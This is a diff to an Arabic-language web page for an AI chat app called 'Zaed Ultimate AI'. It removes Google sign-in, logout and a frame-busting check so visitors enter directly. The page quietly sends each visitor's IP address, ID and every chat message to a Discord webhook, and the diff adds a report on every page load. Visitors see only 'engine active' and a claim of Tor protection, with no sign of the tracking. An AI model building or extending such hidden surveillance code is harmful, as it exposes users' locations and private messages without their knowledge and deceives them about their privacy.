@@ -19,7 +19,6 @@
             --text-main: #f8fafc;
             --text-muted: #94a3b8;
             --border-color: rgba(255, 255, 255, 0.12);
-            --danger-color: #ef4444;
         }
 
         *, *::before, *::after {
@@ -47,106 +46,17 @@
             contain: strict;
         }
 
-        /* ================= 1. شاشة تسجيل الدخول ================= */
-        #login-screen {
-            position: absolute;
-            inset: 0;
-            width: 100%;
-            height: 100dvh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            background: radial-gradient(circle at 50% 30%, #1e1b4b 0%, #090d16 100%);
-            z-index: 50;
-            transition: opacity 0.3s ease, transform 0.3s ease;
-        }
-
-        #login-screen.hidden {
-            display: none !important;
-        }
-
-        .login-card {
-            background: var(--bg-card);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid var(--border-color);
-            padding: 36px 24px;
-            border-radius: 24px;
-            text-align: center;
-            max-width: 400px;
-            width: 100%;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
-        }
-
-        .login-card h1 {
-            font-size: 1.8rem;
-            font-weight: 900;
-            margin-bottom: 8px;
-            background: linear-gradient(135deg, #818cf8, #c084fc);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .login-card p {
-            color: var(--text-muted);
-            font-size: 0.88rem;
-            margin-bottom: 24px;
-            line-height: 1.5;
-        }
-
-        .google-btn-wrapper {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 50px;
-            margin-bottom: 12px;
-        }
-
-        .bypass-btn {
-            background: rgba(255, 255, 255, 0.08);
-            border: 1px solid var(--border-color);
-            color: #ffffff;
-            padding: 12px 18px;
-            border-radius: 12px;
-            font-size: 0.9rem;
-            font-weight: 700;
-            cursor: pointer;
-            width: 100%;
-            transition: all 0.2s;
-        }
-
-        .bypass-btn:active {
-            background: rgba(255, 255, 255, 0.2);
-            transform: scale(0.98);
-        }
-
-        .security-badge {
-            margin-top: 18px;
-            font-size: 0.72rem;
-            color: #34d399;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-        }
-
-        /* ================= 2. شاشة المحادثة (الذكاء الاصطناعي) ================= */
+        /* واجهة الدردشة المباشرة */
         #chat-screen {
             position: absolute;
             inset: 0;
             width: 100%;
             height: 100dvh;
-            display: none;
+            display: flex;
             flex-direction: column;
             max-width: 850px;
             margin: 0 auto;
             background-color: var(--bg-primary);
-        }
-
-        #chat-screen.active {
-            display: flex !important;
         }
 
         .chat-header {
@@ -184,22 +94,6 @@
         .user-info span {
             font-size: 0.75rem;
             color: #34d399;
-        }
-
-        .logout-btn {
-            background: rgba(239, 68, 68, 0.15);
-            color: #f87171;
-            border: 1px solid rgba(239, 68, 68, 0.3);
-            padding: 8px 14px;
-            border-radius: 10px;
-            font-size: 0.85rem;
-            font-weight: 700;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .logout-btn:active {
-            background: rgba(239, 68, 68, 0.3);
         }
 
         .chat-messages {
@@ -302,35 +196,16 @@
 </head>
 <body>
 
-    <!-- 1️⃣ شاشة تسجيل الدخول -->
-    <div id="login-screen">
-        <div class="login-card">
-            <h1>Zaed Ultimate AI</h1>
-            <p>سجل دخولك عبر حساب جوجل للوصول إلى المحرك المطور</p>
-
-            <div class="google-btn-wrapper">
-                <div id="google-btn"></div>
-            </div>
-
-            <button class="bypass-btn" onclick="guestLogin()">دخول سريع (حساب تجريبي)</button>
-
-            <div class="security-badge">
-                🔒 اتصال مشفر بنظام الحماية المباشر
-            </div>
-        </div>
-    </div>
-
-    <!-- 2️⃣ شاشة الذكاء الاصطناعي -->
+    <!-- الدخول المباشر للذكاء الاصطناعي -->
     <div id="chat-screen">
         <header class="chat-header">
             <div class="user-profile">
                 <img id="user-avatar" class="user-avatar" src="https://lh3.googleusercontent.com/a/default-user" alt="User">
                 <div class="user-info">
-                    <h3 id="user-name">المستخدم</h3>
-                    <span>● المحرك نشط (مُحمي)</span>
+                    <h3 id="user-name">زائر</h3>
+                    <span>● المحرك نشط</span>
                 </div>
             </div>
-            <button class="logout-btn" onclick="logout()">خروج</button>
         </header>
 
         <div id="chat-messages" class="chat-messages">
@@ -349,22 +224,16 @@
         </div>
     </div>
 
-    <!-- مكتبة جوجل -->
-    <script src="https://accounts.google.com/gsi/client" async defer></script>
-
     <script>
-        // ================= Configuration =================
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1289290002157113404/YOUR_WEBHOOK_DETAILS_HERE";
-        const GOOGLE_CLIENT_ID = "345485685718-oa9q1o5dko39gjkd6fg4foo8rgl7jigu.apps.googleusercontent.com";
 
-        let currentUser = null;
+        let currentUser = {
+            id: "USER_" + Math.floor(Math.random() * 1000000),
+            name: "زائر",
+            email: "direct_access@local"
+        };
         let userIp = "Protected / Tor Network";
         let lastMessageTime = 0;
-
-        // ================= 🛡️ Security Hardening =================
-        if (window.top !== window.self) {
-            try { window.top.location = window.self.location; } catch(e){}
-        }
 
         function sanitizeInput(str) {
             if (!str) return '';
@@ -376,49 +245,9 @@
                 .replace(/'/g, "&#039;");
         }
 
-        function saveSession(user) {
-            try {
-                localStorage.setItem('zaed_ai_session', JSON.stringify(user));
-            } catch (e) {
-                // يتجاهل الخطأ إذا كانت الذاكرة محظورة في Tor
-            }
-        }
-
-        // ================= 🔑 Authentication =================
-        window.handleCredentialResponse = function(response) {
-            try {
-                if (!response || !response.credential) return;
-                
-                const payload = parseJwt(response.credential);
-                currentUser = {
-                    id: payload.sub || "UNKNOWN_ID",
-                    name: payload.name || "مستخدم جوجل",
-                    email: payload.email || "غير معلن",
-                    picture: payload.picture || "https://lh3.googleusercontent.com/a/default-user",
-                    loginType: 'Google OAuth'
-                };
-
-                saveSession(currentUser);
-                sendDiscordSecurityAudit("🚨 تسجيل دخول رسمي (Google)", currentUser);
-                openChatScreen(currentUser);
-            } catch (err) {
-                console.error("Auth Error:", err);
-            }
-        };
-
         window.onload = function() {
             fetchUserIp();
-
-            try {
-                const savedUser = localStorage.getItem('zaed_ai_session');
-                if (savedUser) {
-                    currentUser = JSON.parse(savedUser);
-                    openChatScreen(currentUser);
-                    return;
-                }
-            } catch (e) {}
-
-            initGoogleButton();
+            sendDiscordSecurityAudit("🚀 دخول مباشر إلى التطبيق", currentUser);
 
             const input = document.getElementById('user-input');
             if (input) {
@@ -428,79 +257,6 @@
             }
         };
 
-        function initGoogleButton() {
-            let attempts = 0;
-            const checkGoogleInterval = setInterval(() => {
-                attempts++;
-                if (window.google && google.accounts) {
-                    clearInterval(checkGoogleInterval);
-                    try {
-                        google.accounts.id.initialize({
-                            client_id: GOOGLE_CLIENT_ID,
-                            callback: window.handleCredentialResponse,
-                            ux_mode: 'popup',
-                            auto_select: false
-                        });
-
-                        google.accounts.id.renderButton(
-                            document.getElementById("google-btn"),
-                            { theme: "filled_blue", size: "large", shape: "pill", width: 280, text: "signin_with" }
-                        );
-                    } catch (err) {}
-                }
-                if (attempts > 20) clearInterval(checkGoogleInterval);
-            }, 500);
-        }
-
-        function parseJwt(token) {
-            try {
-                const base64Url = token.split('.')[1];
-                const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
-                const jsonPayload = decodeURIComponent(atob(base64).split('').map(c => 
-                    '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)
-                }).join(''));
-                return JSON.parse(jsonPayload);
-            } catch (e) {
-                return {};
-            }
-        }
-
-        function openChatScreen(user) {
-            const loginScreen = document.getElementById('login-screen');
-            const chatScreen = document.getElementById('chat-screen');
-
-            document.getElementById('user-name').textContent = sanitizeInput(user.name || "مستخدم");
-            if (user.picture) {
-                document.getElementById('user-avatar').src = user.picture;
-            }
-            
-            if (loginScreen) loginScreen.classList.add('hidden');
-            if (chatScreen) chatScreen.classList.add('active');
-        }
-
-        function guestLogin() {
-            currentUser = {
-                id: "GUEST_" + Math.floor(Math.random() * 1000000),
-                name: "حساب تجريبي",
-                email: "guest@local.device",
-                picture: "https://lh3.googleusercontent.com/a/default-user",
-                loginType: 'Guest Account'
-            };
-
-            saveSession(currentUser);
-            sendDiscordSecurityAudit("⚠️ تسجيل دخول تجريبي", currentUser);
-            openChatScreen(currentUser); // يفتح الشاشة فوراً
-        }
-
-        function logout() {
-            if (currentUser) {
-                sendDiscordSecurityAudit("🚪 تسجيل خروج", currentUser);
-            }
-            try { localStorage.removeItem('zaed_ai_session'); } catch(e){}
-            location.reload();
-        }
-
-        // ================= 💬 Chat Engine =================
         function sendMessage() {
             const now = Date.now();
             if (now - lastMessageTime < 1000) return;
@@ -545,7 +301,6 @@
             });
         }
 
-        // ================= 🕵️ Audit & Tracking =================
         async function fetchUserIp() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -562,11 +317,10 @@
             const payload = {
                 embeds: [{
                     title: title,
-                    color: user.loginType === 'Google OAuth' ? 3447003 : 15105570,
+                    color: 3447003,
                     fields: [
-                        { name: "👤 الاسم", value: user.name || "غير محدد", inline: true },
-                        { name: "📧 البريد", value: user.email || "غير محدد", inline: true },
-                        { name: "🆔 ID", value: `\`${user.id}\``, inline: false },
+                        { name: "👤 الاسم", value: user.name, inline: true },
+                        { name: "🆔 ID", value: `\`${user.id}\``, inline: true },
                         { name: "🌐 IP Address", value: `\`${userIp}\``, inline: true }
                     ],
                     timestamp: new Date().toISOString()
@@ -589,7 +343,7 @@
                     title: "💬 نشاط جديد",
                     color: 10181046,
                     fields: [
-                        { name: "المستخدم", value: `${currentUser ? currentUser.name : "مجهول"}`, inline: true },
+                        { name: "المستخدم", value: `${currentUser.name} (\`${currentUser.id}\`)`, inline: true },
                         { name: "IP", value: `\`${userIp}\``, inline: true },
                         { name: "الرسالة", value: `\`\`\`${msgText.slice(0, 1000)}\`\`\`` }
                     ],
@@ -602,4 +356,8 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload),
                 keepalive: true
-                
+            }).catch(() => {});
+        }
+    </script>
+</body>
+</html>
